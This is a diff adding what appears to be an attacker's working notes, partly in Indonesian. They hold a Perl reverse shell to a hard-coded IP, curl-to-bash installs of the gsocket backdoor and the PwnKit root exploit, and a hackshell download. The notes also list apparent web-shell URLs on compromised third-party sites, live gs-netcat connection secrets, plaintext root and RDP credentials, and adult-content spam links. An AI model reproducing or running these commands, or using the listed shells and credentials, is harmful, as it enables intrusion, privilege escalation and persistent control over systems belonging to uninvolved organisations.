@@ -1,0 +1,58 @@
+perl -e 'use Socket;$i="149.28.154.229";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+GS
+bash -c "$(curl -fsSL https://gsocket.io/x)"
+
+
+https://bokepcrot.sale/bokep-indo-kakak-ludahin-supaya-licin/
+https://bokepcrot.sale/bokep-indo-kakak-mulai-perlihatkan-sifat-asli/
+https://bokepcrot.sale/bokep-indo-tante-lulus-seleksi-model-majalah/
+https://bokepcrot.sale/bokep-indo-tante-alis-tebal-masih-malu/
+
+BUG ROOT
+sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
+
+SYARAT ROOT 
+- KERNEL DIBAWAH TAHUN 2021
+
+CEK ROOT
+ls -la /usr/bin/pkexec 
+
+CIRI2 VULN BUG ROOT PWNKIT
+-rwsr-xr-x. 1 root root 27680 Apr 11  2018 /usr/bin/pkexec
+
+CIRI2 BUG ROOT PWNKIT DIPATCH 
+-rwxr-xr-x. 1 root root 27680 Apr 11  2018 /usr/bin/pkexec
+
+vps
+Main IP: 149.28.154.229
+username: root
+Root pass: seok1337@@
+
+
+https://hr.tarunabakti.or.id//asset/manfile/include/wget-md5.php
+--> To connect use one of the following:
+--> gs-netcat -s "33oMk7CjanyEF67ZCWiQ4m" -i
+
+
+crot ahhh
+https://vestibular.vianna.edu.br/uploads/ps-documentacao-candidatos/error.php
+dir awal
+https://vestibular.vianna.edu.br/uploads/ps-documentacao-candidatos/6678ab5030da8fc3aafefaea9608941b.php
+
+
+--> To uninstall use GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/x)"
+--> To connect use one of the following:
+--> gs-netcat -s "69GLzvu8YUVgkqV4f2gDAx" -i
+
+
+baru ulik
+curl -o hackshell.sh https://raw.githubusercontent.com/hackerschoice/hackshell/refs/heads/main/hackshell.sh
+source ./hackshell.sh
+
+
+rdp
+IP : 213.35.98.245
+User : opc
+Pass : @Senoparty88
+
